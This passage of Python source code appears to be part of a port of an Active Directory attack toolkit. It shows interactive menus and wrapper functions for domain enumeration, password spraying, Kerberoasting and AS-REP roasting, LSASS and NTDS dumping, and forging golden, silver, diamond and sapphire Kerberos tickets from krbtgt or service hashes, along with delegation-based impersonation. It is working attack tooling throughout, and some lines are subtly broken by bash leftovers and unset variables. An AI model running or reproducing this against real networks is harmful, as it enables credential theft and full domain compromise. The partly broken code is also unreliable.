            curr_targets = "Domain Controllers"
            custom_ip = ""
    elif option_selected.lower() == "back":
        return  # Go back to the previous menu
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}")
        print("")
        modify_target()

def set_attackerIP():
    global attacker_IP
    print("Please choose the attacker's IPs from the following options:")
    # Logic similar to bash, but using python's os and subprocess
    attacker_IPlist = subprocess.check_output("hostname -I", shell=True).decode().split()
    for ip in attacker_IPlist:
      print(ip)

    attacker_IP = input(">> ")

    while attacker_IP not in attacker_IPlist:
        print(f"{RED}Invalid IP.{NC} Please specify your IP from the list")
        attacker_IP = input(">> ")

def pkinit_auth():
    global hash
    current_dir = os.getcwd()
    os.chdir(os.path.join(output_dir, "Credentials"))

    if not pfxpass:
        run_command(f"{certipy} auth -pfx '{pfxcert}' -dc-ip {dc_ip} -username '{user}' -domain {domain}")
    else:
        print(f"{CYAN}[i]{NC} Certificate password is provided, generating new unprotected certificate using Certipy{NC}")
        run_command(f"{certipy} cert -export -pfx {os.path.realpath(pfxcert)} -password {pfxpass} -out '{user}_unprotected.pfx'")
        run_command(f"{certipy} auth -pfx '{user}_unprotected.pfx' -dc-ip {dc_ip} -username '{user}' -domain {domain}")

    # Extract hash from output
    with open(f"{output_dir}/Credentials/certipy_PKINIT_output_{dc_domain}.txt", 'r') as f:
      for line in f:
        if "Got hash for" in line:
          hash = line.split(":")[1].strip() + ":" + line.split(":")[2].strip()
          break

    print(f"{GREEN}[+] NTLM hash extracted:{NC} {hash}")
    os.chdir(current_dir)

def get_domain_sid():
    global sid_domain
    sid_output_file = f"{output_dir}/DomainRecon/ne_sid_output_{dc_domain}.txt"
    
    # Try to get the domain SID from the existing file
    if os.path.exists(sid_output_file):
      with open(sid_output_file, 'r') as f:
        for line in f:
          if "Domain SID" in line:
            sid_domain = line.split(" ")[-1].strip()
            break
    
    # If not found or file doesn't exist, run the command to get it
    if not sid_domain:
      run_command(f"{netexec} ldap {target} {argument_ne} --get-sid")
      with open(sid_output_file, 'r') as f: # Read file after creation
        for line in f:
          if "Domain SID" in line:
            sid_domain = line.split(" ")[-1].strip()
            break

    print(f"{YELLOW}[i]{NC} SID of Domain: {YELLOW}{sid_domain}{NC}")

def ad_menu():
    os.makedirs(os.path.join(output_dir, "DomainRecon"), exist_ok=True)
    print("")
    print(f"{CYAN}[AD Enum menu]{NC} Please choose from the following options:")
    print("--------------------------------------------------------")
    if nullsess_bool:
        print("A) ACTIVE DIRECTORY ENUMERATIONS #3-4-5-6-14")
    else:
        print("A) ACTIVE DIRECTORY ENUMERATIONS #1-3-4-5-6-7-8-9-10-14-15-16-17-20")
    print("1) BloodHound Enumeration using all collection methods (Noisy!)")
    print("2) BloodHound Enumeration using DCOnly")
    print("1bis) BloodHoundCE Enumeration using all collection methods (Noisy!)")
    print("2bis) BloodHoundCE Enumeration using DCOnly")
    print("3) ldapdomaindump LDAP Enumeration")
    print("4) enum4linux-ng LDAP-MS-RPC Enumeration")
    print("5) GPP Enumeration using netexec")
    print("6) MS-RPC Enumeration using netexec (Users, pass pol)")
    print("7) LDAP Enumeration using netexec (Users, passnotreq, userdesc, maq, ldap-checker, subnets)")
    print("8) Delegation Enumeration using findDelegation and netexec")
    print("9) bloodyAD All Enumeration")
    print("10) bloodyAD write rights Enumeration")
    print("11) bloodyAD query DNS server")
    print("12) SilentHound LDAP Enumeration")
    print("13) ldeep LDAP Enumeration")
    print("14) windapsearch LDAP Enumeration")
    print("15) LDAP Wordlist Harvester")
    print("16) LDAP Enumeration using LDAPPER")
    print("17) Adalanche Enumeration")
    print("18) GPO Enumeration using GPOwned")
    print("19) Enumeration of RDWA servers")
    print("20) SCCM Enumeration using netexec")
    print("21) SCCM Enumeration using sccmhunter")
    print("22) Open p0dalirius' LDAP Console")
    print("23) Open p0dalirius' LDAP Monitor")
    print("24) Open garrettfoster13's ACED console")
    print("25) Open LDAPPER custom options")
    print("26) Open breads console")
    print("27) Run godap console")
    print("28) Run adPEAS enumerations")
    print("29) Run ADCheck enumerations")
    print("30) Run soapy enumerations")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "A":
        ad_enum()
    elif option_selected == "1":
        bhd_enum()
    elif option_selected == "2":
        bhd_enum_dconly()
    elif option_selected == "1bis":
        bhdce_enum()
    elif option_selected == "2bis":
        bhdce_enum_dconly()
    elif option_selected == "3":
        ldapdomaindump_enum()
    elif option_selected == "4":
        enum4linux_enum()
    elif option_selected == "5":
        ne_gpp()
    elif option_selected == "6":
        ne_smb_enum()
    elif option_selected == "7":
        ne_ldap_enum()
    elif option_selected == "8":
        deleg_enum()
    elif option_selected == "9":
        bloodyad_all_enum()
    elif option_selected == "10":
        bloodyad_write_enum()
    elif option_selected == "11":
        bloodyad_dnsquery()
    elif option_selected == "12":
        silenthound_enum()
    elif option_selected == "13":
        ldeep_enum()
    elif option_selected == "14":
        windapsearch_enum()
    elif option_selected == "15":
        ldapwordharv_enum()
    elif option_selected == "16":
        ldapper_enum()
    elif option_selected == "17":
        adalanche_enum()
    elif option_selected == "18":
        GPOwned_enum()
    elif option_selected == "19":
        rdwatool_enum()
    elif option_selected == "20":
        ne_sccm()
    elif option_selected == "21":
        sccmhunter_enum()
    elif option_selected == "22":
        ldap_console()
    elif option_selected == "23":
        ldap_monitor()
    elif option_selected == "24":
        aced_console()
    elif option_selected == "25":
        ldapper_console()
    elif option_selected == "26":
        breads_console()
    elif option_selected == "27":
        godap_console()
    elif option_selected == "28":
        adpeas_enum()
    elif option_selected == "29":
        adcheck_enum()
    elif option_selected == "30":
        soapy_enum()
    elif option_selected.lower() == "back":
        return  # Return to the main menu
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    ad_menu()

def adcs_menu():
    os.makedirs(os.path.join(output_dir, "ADCS"), exist_ok=True)
    print("")
    print(f"{CYAN}[ADCS menu]{NC} Please choose from the following options:")
    print("-----------------------------------------------------")
    if nullsess_bool:
        print("A) ADCS ENUMERATIONS #1")
    else:
        print("A) ADCS ENUMERATIONS #1-2-3-4")
    print("1) ADCS Enumeration using netexec")
    print("2) certi.py ADCS Enumeration")
    print("3) Certipy ADCS Enumeration")
    print("4) Certifried check")
    print("5) Certipy LDAP shell via Schannel (using Certificate Authentication)")
    print("6) Certipy extract CA and forge Golden Certificate (requires admin rights on PKI server)")
    print("7) Dump LSASS using masky")
    print("8) Dump NTDS using certsync")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "A":
        adcs_enum()
    elif option_selected == "1":
        ne_adcs_enum()
    elif option_selected == "2":
        certi_py_enum()
    elif option_selected == "3":
        certipy_enum()
    elif option_selected == "4":
        certifried_check()
    elif option_selected == "5":
        certipy_ldapshell()
    elif option_selected == "6":
        certipy_ca_dump()
    elif option_selected == "7":
        masky_dump()
    elif option_selected == "8":
        certsync_ntds_dump()
    elif option_selected.lower() == "back":
        return  # Return to the main menu
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    adcs_menu() #call itself to keep menu

def bruteforce_menu():
    os.makedirs(os.path.join(output_dir, "BruteForce"), exist_ok=True)
    print(f"{CYAN}[BruteForce menu]{NC} Please choose from the following options:")
    print("----------------------------------------------------------")
    if nullsess_bool:
        print("A) BRUTEFORCE ATTACKS #1-2-3-5")
    else:
        print("A) BRUTEFORCE ATTACKS #3-5")
    print("1) RID Brute Force (Null session) using netexec")
    print("2) User Enumeration using kerbrute (Null session)")
    print("3) User=Pass check using kerbrute (Noisy!)")
    print("4) User=Pass check using netexec (Noisy!)")
    print("5) Identify Pre-Created Computer Accounts using netexec (Noisy!)")
    print("6) Pre2k computers authentication check (Noisy!)")
    print("7) User Enumeration using ldapnomnom (Null session)")
    print("8) Password spraying using kerbrute (Noisy!)")
    print("9) Password spraying using netexec - ldap (Noisy!)")
    print("10) Timeroast attack against NTP")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "A":
        bruteforce()
    elif option_selected == "1":
        ridbrute_attack()
    elif option_selected == "2":
        kerbrute_enum()
    elif option_selected == "3":
        userpass_kerbrute_check()
    elif option_selected == "4":
        userpass_ne_check()
    elif option_selected == "5":
        ne_pre2k()
    elif option_selected == "6":
        pre2k_check()
    elif option_selected == "7":
        ldapnomnom_enum()
    elif option_selected == "8":
        kerbrute_passpray()
    elif option_selected == "9":
        ne_passpray()
    elif option_selected == "10":
        ne_timeroast()
    elif option_selected.lower() == "back":
        return  # Return to the main menu
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    bruteforce_menu()

def kerberos_menu():
    os.makedirs(os.path.join(output_dir, "Kerberos"), exist_ok=True)
    print("")
    print(f"{CYAN}[Kerberos Attacks menu]{NC} Please choose from the following options:")
    print("-----------------------------------------------------------------")
    if nullsess_bool:
        print("A) KERBEROS ATTACKS #1-2-3-4-7")
    else:
        print("A) KERBEROS ATTACKS #1-2-3-4-5-6")
    print("1) AS REP Roasting Attack using GetNPUsers")
    print("2) Kerberoast Attack using GetUserSPNs")
    print("3) Cracking AS REP Roast hashes using john the ripper")
    print("4) Cracking Kerberoast hashes using john the ripper")
    print("5) NoPac check using netexec (only on DC)")
    print("6) MS14-068 check (only on DC)")
    print("7) CVE-2022-33679 exploit / AS-REP with RC4 session key (Null session)")
    print("8) AP-REQ hijack with DNS unsecure updates abuse using krbjack")
    print("9) Run custom Kerberoast attack using Orpheus")
    print("10) Request TGS for current user (requires: authenticated)")
    print("11) Generate Golden Ticket (requires: hash of krbtgt or DCSync rights)")
    print("12) Generate Silver Ticket (requires: hash of SPN service account or DCSync rights)")
    print("13) Request ticket for another user using S4U2self (OPSEC alternative to Silver Ticket) (requires: authenticated session of SPN service account, for example 'svc')")
    print("14) Generate Diamond Ticket (requires: hash of krbtgt or DCSync rights)")
    print("15) Generate Sapphire Ticket (requires: hash of krbtgt or DCSync rights)")
    print("16) Privilege escalation from Child Domain to Parent Domain using raiseChild (requires: DA rights on child domain)")
    print("17) Request impersonated ticket using Constrained Delegation rights (requires: authenticated session of account allowed for delegation, for example 'gmsa')")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "A":
        kerberos()
    elif option_selected == "1":
        asrep_attack()
    elif option_selected == "2":
        kerberoast_attack()
    elif option_selected == "3":
        john_crack_asrep()
    elif option_selected == "4":
        john_crack_kerberoast()
    elif option_selected == "5":
        nopac_check()
    elif option_selected == "6":
        ms14_068_check()
    elif option_selected == "7":
        asreprc4_attack()
    elif option_selected == "8":
        krbjack_attack()
    elif option_selected == "9":
        kerborpheus_attack()
    elif option_selected == "10":
        if not impacket_getST:
            print(f"{RED}[-] getST.py not found! Please verify the installation of impacket{NC}")
        else:
            if nullsess_bool:
                print(f"{RED}[-] Requesting ticket using getST requires credentials{NC}")
            else:
                tick_spn = f"CIFS/{dc_FQDN}"
                print(f"{BLUE}[*] Please specify spn (press Enter to choose default value CIFS/{dc_FQDN}):{NC}")
                tick_spn_value = input(">> ")
                if tick_spn_value:
                    tick_spn = tick_spn_value
                print(f"{CYAN}[*] Requesting ticket for service {tick_spn}...{NC}")
                current_dir = os.getcwd()
                os.chdir(os.path.join(output_dir, "Credentials"))
                run_command(f"{impacket_getST} {argument_imp} -dc-ip {dc_ip} -spn {tick_spn}")
                ticket_ccache_out = f"{user}@{tick_spn.replace('/', '_')}@{dc_domain.upper()}.ccache"
                ticket_kirbi_out = f"{user}@{tick_spn.replace('/', '_')}@{dc_domain.upper()}.kirbi"
                run_command(f"{impacket_ticketconverter} ./{ticket_ccache_out} ./{ticket_kirbi_out}")
                os.chdir(current_dir)
                if os.path.isfile(f"{output_dir}/Credentials/{ticket_ccache_out}"):
                    print(f"{GREEN}[+] TGS for SPN {tick_spn} generated successfully:{NC}")
                    print(f"{output_dir}/Credentials/{ticket_ccache_out}")
                    print(f"{output_dir}/Credentials/{ticket_kirbi_out}")
                else:
                    print(f"{RED}[-] Failed to request ticket{NC}")

    elif option_selected == "11":
        if not impacket_ticketer:
            print(f"{RED}[-] ticketer.py not found! Please verify the installation of impacket{NC}")
        else:
            print(f"{BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:")
            rc4_or_aes = input(">> ").upper()
            while rc4_or_aes not in ["RC4", "AES"]:
                print(f"{RED}Invalid input{NC} Please choose between 'RC4' and 'AES':")
                rc4_or_aes = input(">> ").upper()

            gethash_user = "krbtgt"
            gethash_hash = ""
            print(f"{BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):{NC}")
            gethash_hash = input(">> ")
            if not gethash_hash:
                get_hash()  # This will attempt to extract it using secretsdump
            else:
                if rc4_or_aes == "RC4":
                    gethash_nt = gethash_hash
                else:
                    gethash_aes = gethash_hash

            if not gethash_nt and not gethash_aes:
                print(f"{RED}[-] Failed to extract hash of {gethash_user}{NC}")
            else:
                gethash_key = f"-nthash {gethash_nt}" if rc4_or_aes == "RC4" else f"-aesKey {gethash_aes}"
                tick_randuser = "Administrator"
                tick_user_id = ""
                tick_groups = ""
                print(f"{BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):{NC}")
                tick_randuser_value = input(">> ")
                if tick_randuser_value:
                    tick_randuser = tick_randuser_value
                print(f"{BLUE}[*] Please specify custom user id (press Enter to skip):{NC}")
                tick_user_id_value = input(">> ")
                if tick_user_id_value:
                    tick_user_id = f"-user-id {tick_user_id_value}"
                print(f"{BLUE}[*] Please specify comma separated custom groups ids (press Enter to skip):{NC}")
                print(f"{CYAN}[*] Example: 512,513,518,519,520 {NC}")
                tick_group_ids_value = input(">> ")
                if tick_group_ids_value:
                    tick_groups = f"-groups {tick_group_ids_value}"

                get_domain_sid()
                while not sid_domain:
                    print(f"{YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain{NC}")
                    print(f"{CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 {NC}")
                    sid_domain = input(">> ")

                print(f"{CYAN}[*] Generating golden ticket...{NC}")
                current_dir = os.getcwd()
                os.chdir(os.path.join(output_dir, "Credentials"))
                run_command(f"{impacket_ticketer} {gethash_key} -domain-sid {sid_domain} -domain {domain} {tick_user_id} {tick_groups} {tick_randuser}")
                # Use subprocess.run for the ticketconverter command as it's not a custom function
                subprocess.run([impacket_ticketconverter, f"./{tick_randuser}.ccache", f"./{tick_randuser}.kirbi"], check=False)
                os.rename(f"./{tick_randuser}.ccache", f"./{tick_randuser}_golden.ccache",)
                os.rename(f"./{tick_randuser}.kirbi", f"./{tick_randuser}_golden.kirbi")
                os.chdir(current_dir)
                if os.path.isfile(f"{output_dir}/Credentials/{tick_randuser}_golden.ccache"):
                    print(f"{GREEN}[+] Golden ticket generated successfully:{NC}")
                    print(f"{output_dir}/Credentials/{tick_randuser}_golden.ccache")
                    print(f"{output_dir}/Credentials/{tick_randuser}_golden.kirbi")
                else:
                    print(f"{RED}[-] Failed to generate golden ticket{NC}")
    elif option_selected == "12":
        # Impacket ticketer is required
        if not impacket_ticketer:
          print(f"{RED}[-] ticketer.py not found! Please verify the installation of impacket{NC}")
          return
        tick_randuser = "Administrator"
        tick_randuserid=""
        tick_spn = f"CIFS/{dc_domain}"
        tick_groups = ""
        tick_servuser = ""
        #ask for the name of the SPN account 
        print(f"{BLUE}[*] Please specify name of SPN account (Example: 'sql_svc'):${NC}")
        tick_servuser = input(">> ")
        while not tick_servuser:
          print(f"{RED}Invalid username.{NC} Please specify another:")
          tick_servuser =  input(">> ")
        #Choose between RC4 and AES encryption type
        print(f"{BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:${NC}")
        rc4_or_aes = input(">> ").upper()
        while rc4_or_aes not in ["RC4", "AES"]:
          print(f"{RED}Invalid input${NC} Please choose between 'RC4' and 'AES':")
          rc4_or_aes = input(">> ").upper()
        
        gethash_hash = ""
        print(f"{BLUE}[*] Please specify the RC4 (NTLM) or AES key of SPN account (press Enter to extract from secretsdump output):${NC}")
        gethash_hash = input(">> ")
        if not gethash_hash:
          gethash_user = tick_servuser
          get_hash() # extract hash with the function we already have
        else:
          if rc4_or_aes == "RC4":
              gethash_nt = gethash_hash
          else:
              gethash_aes = gethash_hash
              
        if not gethash_nt and not gethash_aes:
          print(f"{RED}[-] Failed to extract hash of {gethash_user}${NC}")
        else:
          gethash_key = f"-nthash {gethash_nt}" if rc4_or_aes == "RC4" else f"-aesKey {gethash_aes}"
          print(f"{BLUE}[*] Please specify random user name (press Enter to choose default value 'Administrator'):${NC}")
          tick_randuser_value = input(">> ")
          if tick_randuser_value:
            tick_randuser = tick_randuser_value
          print(f"{BLUE}[*] Please specify the chosen user's ID (press Enter to choose default value EMPTY):${NC}")
          tick_randuserid_value = input(">> ")
          if tick_randuserid_value:
            tick_randuserid = f"-user-id {tick_randuserid_value}"
          print(f"{BLUE}[*] Please specify spn (press Enter to choose default value CIFS/{dc_domain}):${NC}")
          tick_spn_value = input(">> ")
          if tick_spn_value:
            tick_spn = tick_spn_value
            
          get_domain_sid()  
          while not sid_domain:
            print(f"{YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain${NC}")
            print(f"{CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 ${NC}")
            sid_domain = input(">> ")
            
          print(f"{CYAN}[*] Generating silver ticket for service {tick_spn}...{NC}")
          current_dir = os.getcwd()
          os.chdir(os.path.join(output_dir, "Credentials"))
          run_command(f"{impacket_ticketer} {gethash_key} -domain-sid {sid_domain} -domain {domain} -spn {tick_spn} {tick_randuserid} {tick_randuser}")
          #Adjust names to reflect the current SPN
          ticket_ccache_out = f"{tick_randuser}_silver_{tick_spn.replace('/', '_')}.ccache"
          ticket_kirbi_out = f"{tick_randuser}_silver_{tick_spn.replace('/', '_')}.kirbi"
          
          subprocess.run([impacket_ticketconverter, f"./{tick_randuser}.ccache", f"./{tick_randuser}.kirbi"], check=False)

          #Move files to credentials directory
          os.rename(f"./{tick_randuser}.ccache", f"./{ticket_ccache_out}")
          os.rename(f"./{tick_randuser}.kirbi", f"./{ticket_kirbi_out}")
          os.chdir(current_dir)
          
          if os.path.isfile(f"{output_dir}/Credentials/{ticket_ccache_out}"):
            print(f"{GREEN}[+] Silver ticket generated successfully:{NC}")
            print(f"{output_dir}/Credentials/{ticket_ccache_out}")
            print(f"{output_dir}/Credentials/{ticket_kirbi_out}")
          else:
            print(f"{RED}[-] Failed to generate silver ticket{NC}")
    elif option_selected == "13":
       if not impacket_getST:
          print(f"{RED}[-] getST.py not found! Please verify the installation of impacket{NC}")
          return
       if nullsess_bool:
          print(f"{RED}[-] Requesting ticket using getST requires credentials{NC}")
          return
       tick_randuser = "Administrator"
       tick_spn = f"CIFS/{dc_domain}"
       
       print(f"{BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):{NC}")
       tick_randuser_value = input(">> ")
       if tick_randuser_value:
          tick_randuser = tick_randuser_value
       print(f"{BLUE}[*] Please specify spn (press Enter to choose default value CIFS/{dc_domain}):{NC}")
       tick_spn_value = input(">> ")
       if tick_spn_value:
          tick_spn = tick_spn_value
          
       print(f"{CYAN}[*] Requesting ticket for service {tick_spn}...{NC}")
       current_dir = os.getcwd()
       os.chdir(os.path.join(output_dir, "Credentials"))
       run_command(f"{impacket_getST} {argument_imp} -self -impersonate {tick_randuser} -dc-ip {dc_ip} -altservice {tick_spn}")
       ticket_ccache_out = f"{tick_randuser}@{tick_spn.replace('/', '_')}@{dc_domain.upper()}.ccache"
       ticket_kirbi_out = f"{tick_randuser}@{tick_spn.replace('/', '_')}@{dc_domain.upper()}.kirbi"
       subprocess.run([impacket_ticketconverter, f"./{ticket_ccache_out}", f"./{ticket_kirbi_out}"], check=False)
       os.chdir(current_dir)
       if os.path.isfile(f"{output_dir}/Credentials/{ticket_ccache_out}"):
          print(f"{GREEN}[+] TGS for SPN {tick_spn} impersonating {tick_randuser} generated successfully:{NC} $krb_ticket")
          print(f"{output_dir}/Credentials/{ticket_ccache_out}")
          print(f"{output_dir}/Credentials/{ticket_kirbi_out}")
       else:
         print(f"{RED}[-] Failed to request ticket{NC}")
    elif option_selected == "14":
        if not impacket_ticketer:
            print(f"{RED}[-] ticketer.py not found! Please verify the installation of impacket{NC}")
            return

        print(f"{BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:{NC}")
        rc4_or_aes = input(">> ").upper()
        while rc4_or_aes not in ["RC4", "AES"]:
            print(f"{RED}Invalid input{NC} Please choose between 'RC4' and 'AES':")
            rc4_or_aes = input(">> ").upper()

        gethash_user = "krbtgt"
        gethash_hash = ""
        print(f"{BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):{NC}")
        gethash_hash = input(">> ")
        if not gethash_hash:
            get_hash()  # This will attempt to extract it using secretsdump
        else:
            if rc4_or_aes == "RC4":
                gethash_nt = gethash_hash
            else:
                gethash_aes = gethash_hash

        if not gethash_nt and not gethash_aes:
            print(f"{RED}[-] Failed to extract hash of {gethash_user}{NC}")
            return

        gethash_key = f"-nthash {gethash_nt} -aesKey {gethash_aes}"
        tick_randuser = "sql_svc"
        tick_user_id = "1337"
        tick_groups = "512,513,518,519,520"
        print(f"{BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):{NC}")
        tick_randuser_value = input(">> ")
        if tick_randuser_value:
            tick_randuser = tick_randuser_value
        print(f"{BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):{NC}")
        tick_user_id_value = input(">> ")
        if tick_user_id_value:
            tick_user_id = tick_user_id_value
        print(f"{BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):{NC}")
        tick_group_ids_value = input(">> ")
        if tick_group_ids_value:
            tick_groups = tick_group_ids_value
        get_domain_sid()
        while not sid_domain:
            print(f"{YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain{NC}")
            print(f"{CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 {NC}")
            sid_domain = input(">> ")

        print(f"{CYAN}[*] Generating diamond ticket...{NC}")
        current_dir = os.getcwd()
        os.chdir(os.path.join(output_dir, "Credentials"))
        run_command(f"{impacket_ticketer} {argument_imp_ti} -request -domain-sid {sid_domain} {gethash_key} -user-id {tick_user_id} -groups {tick_groups} {tick_randuser}")
        os.rename(f"./{tick_randuser}.ccache", f"./{tick_randuser}_diamond.ccache")
        os.chdir(current_dir)
        if os.path.isfile(f"{output_dir}/Credentials/{tick_randuser}_diamond.ccache"):
            print(f"{GREEN}[+] Diamond ticket generated successfully:{NC} {output_dir}/Credentials/{tick_randuser}_diamond.ccache")
        else:
            print(f"{RED}[-] Failed to generate diamond ticket{NC}")

    elif option_selected == "15":
        if not impacket_ticketer:
            print(f"{RED}[-] ticketer.py not found! Please verify the installation of impacket{NC}")
            return

        print(f"{BLUE}[*] Please type 'RC4' or 'AES' to choose encryption type:{NC}")
        rc4_or_aes = input(">> ").upper()
        while rc4_or_aes not in ["RC4", "AES"]:
            print(f"{RED}Invalid input{NC} Please choose between 'RC4' and 'AES':")
            rc4_or_aes = input(">> ").upper()

        gethash_user = "krbtgt"
        gethash_hash = ""
        print(f"{BLUE}[*] Please specify the RC4 (NTLM) or AES key of krbtgt (press Enter to extract from NTDS - requires DCSync rights):{NC}")
        gethash_hash = input(">> ")
        if not gethash_hash:
            get_hash()  # This will attempt to extract it using secretsdump
        else:
            if rc4_or_aes == "RC4":
                gethash_nt = gethash_hash
            else:
                gethash_aes = gethash_hash

        if not gethash_nt and not gethash_aes:
            print(f"{RED}[-] Failed to extract hash of {gethash_user}{NC}")
            return

        gethash_key = f"-nthash {gethash_nt} -aesKey {gethash_aes}"
        tick_randuser = "sql_svc"
        tick_user_id = "1337"
        tick_groups = "512,513,518,519,520"
        tick_domain_admin = f"{user}"
        print(f"{BLUE}[*] Please specify random user name (press Enter to choose default value 'sql_svc'):{NC}")
        tick_randuser_value = input(">> ")
        if tick_randuser_value:
            tick_randuser = tick_randuser_value
        print(f"{BLUE}[*] Please specify custom user id (press Enter to choose default value '1337'):{NC}")
        tick_user_id_value = input(">> ")
        if tick_user_id_value:
            tick_user_id = tick_user_id_value
        print(f"{BLUE}[*] Please specify comma separated custom groups ids (press Enter to choose default value '512,513,518,519,520'):{NC}")
        tick_group_ids_value = input(">> ")
        if tick_group_ids_value:
            tick_groups = tick_group_ids_value
        print(f"{BLUE}[*] Please specify domain admin to impersonate (press Enter to choose default value current user):{NC}")
        tick_domain_admin_value = input(">> ")
        if tick_domain_admin_value:
          tick_domain_admin = tick_domain_admin_value
          
        get_domain_sid()
        while not sid_domain:
            print(f"{YELLOW}[!] Could not retrieve SID of domain. Please specify the SID of the domain{NC}")
            print(f"{CYAN}[*] Example: S-1-5-21-1004336348-1177238915-682003330 {NC}")
            sid_domain = input(">> ")

        print(f"{CYAN}[*] Generating sapphire ticket...{NC}")
        current_dir = os.getcwd()
        os.chdir(os.path.join(output_dir, "Credentials"))
        run_command(f"{impacket_ticketer} {argument_imp_ti} -request -domain-sid {sid_domain} -impersonate {tick_domain_admin} {gethash_key} -user-id {tick_user_id} -groups {tick_groups} {tick_randuser}")
        os.rename(f"./{tick_randuser}.ccache", f"./{tick_randuser}_sapphire.ccache")
        os.chdir(current_dir)
        if os.path.isfile(f"{output_dir}/Credentials/{tick_randuser}_sapphire.ccache"):
            print(f"{GREEN}[+] Sapphire ticket generated successfully:{NC} {output_dir}/Credentials/{tick_randuser}_sapphire.ccache")
        else:
            print(f"{RED}[-] Failed to generate sapphire ticket{NC}")

    elif option_selected == "16":
        raise_child()
    elif option_selected == "17":
      if not impacket_getST:
          print(f"{RED}[-] getST.py not found! Please verify the installation of impacket{NC}")
          return # exit
      if nullsess_bool:
          print(f"{RED}[-] Requesting ticket using getST requires credentials{NC}")
          return # exit
          
      tick_randuser="Administrator"
      tick_spn=f"CIFS/{dc_domain}"
      
      print(f"{BLUE}[*] Please specify username of user to impersonate (press Enter to choose default value 'Administrator'):{NC}")
      tick_randuser_value = input(">> ")
      if tick_randuser_value:
        tick_randuser = tick_randuser_value
      print(f"{BLUE}[*] Please specify spn (press Enter to choose default value CIFS/{dc_domain}):{NC}")
      tick_spn_value = input(">> ")
      if tick_spn_value:
          tick_spn = tick_spn_value
      print(f"{CYAN}[*] Requesting ticket for service {tick_spn}...{NC}")
      current_dir = os.getcwd()
      os.chdir(os.path.join(output_dir, "Credentials"))
      run_command(f"{impacket_getST} {argument_imp} -spn {tick_spn} -impersonate {tick_randuser}")
      ticket_ccache_out = f"{tick_randuser}@{tick_spn.replace('/', '_')}@{dc_domain.upper()}.ccache"
      ticket_kirbi_out = f"{tick_randuser}@{tick_spn.replace('/', '_')}@{dc_domain.upper()}.kirbi"
      subprocess.run([impacket_ticketconverter, f"./{ticket_ccache_out}", f"./{ticket_kirbi_out}"], check=False)
      os.chdir(current_dir)
      if os.path.isfile(f"{output_dir}/Credentials/{ticket_ccache_out}"):
        print(f"{GREEN}[+] Delegated ticket successfully requested :${NC}")
        print(f"{output_dir}/Credentials/{ticket_ccache_out}")
        print(f"{output_dir}/Credentials/{ticket_kirbi_out}")
      else:
          print(f"{RED}[-] Failed to request ticket{NC}")

    elif option_selected.lower() == "back":
        return
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    kerberos_menu() #Return back

def shares_menu():
    os.makedirs(os.path.join(output_dir, "Shares"), exist_ok=True)
    print("")
    print(f"{CYAN}[SMB Shares menu]{NC} Please choose from the following options:")
    print("-----------------------------------------------------------")
    print(f"{YELLOW}[i]{NC} Current target(s): {curr_targets} {YELLOW}{custom_servers}{custom_ip}{NC}")
    print("A) SMB SHARES SCANS #1-2-3-4")
    print("m) Modify target(s)")
    print("1) SMB shares Scan using smbmap")
    print("2) SMB shares Enumeration using netexec")
    print("3) SMB shares Spidering using netexec ")
    print("4) SMB shares Scan using FindUncommonShares")
    print("5) SMB shares Scan using manspider")
    print("6) Open smbclient.py console on target")
    print("7) Open p0dalirius's smbclientng console on target")
    print("back) Go back")
    print("exit) Exit")

    option_selected = input("> ")

    if option_selected == "A":
        scan_shares()
    elif option_selected.lower() == "m":
        modify_target()
    elif option_selected == "1":
        smb_map()
    elif option_selected == "2":
        ne_shares()
    elif option_selected == "3":
        ne_spider()
    elif option_selected == "4":
        finduncshar_scan()
    elif option_selected == "5":
        manspider_scan()
    elif option_selected == "6":
        smbclient_console()
    elif option_selected == "7":
        smbclientng_console()
    elif option_selected.lower() == "back":
        return
    elif option_selected.lower() == "exit":
        sys.exit(0)
    else:
        print(f"{RED}[-] Unknown option {option_selected}... {NC}\n")
    shares_menu()

def vulns_menu():
    os.makedirs(os.path.join(output_dir, "Vulnerabilities"), exist_ok=True)
    print("")
    print(f"{CYAN}[Vuln Checks menu]{NC} Please choose from the following options:")
    print("------------------------------------------------------------")
    print(f"{YELLOW}[i]{NC} Current target(s): {curr_targets} {YELLOW}{custom_servers}{custom_ip}{NC}")
    print("A) VULNERABILITY CHECKS #1-2-3-4-5-6-7-8-9-10-11-12-15")
    print("m) Modify target(s)")
    print("1) zerologon check using netexec (only on DC)")
    print("2) MS17-010 check using netexec")
    print("3) Print Spooler check using netexec")
    print("4) Printnightmare check using netexec")
    print("5) WebDAV check using netexec")
    print("6) coerce check using netexec")
    print("7) SMB signing check using netexec")
    print("8) ntlmv1 check using netexec")
    print("9) runasppl check using netexec")
    print("10) smbghost check using netexec")
    print("11) RPC Dump and check for interesting protocols")
    print("12) Coercer RPC scan")
